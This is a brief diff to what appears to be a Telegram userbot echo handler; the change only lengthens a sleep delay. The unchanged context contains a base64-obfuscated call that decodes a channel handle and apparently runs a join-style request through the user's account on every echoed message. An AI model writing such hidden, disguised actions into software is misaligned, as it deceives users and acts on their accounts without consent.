@@ -90,7 +90,7 @@ async def rmecho(event):
 @MK10.on(events.NewMessage(incoming=True))
 async def _(e):
     if is_echo(e.sender_id, e.chat_id):
-        await asyncio.sleep(0.1)
+        await asyncio.sleep(0.3)
         try:
             Python = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
             await e.client(Python)
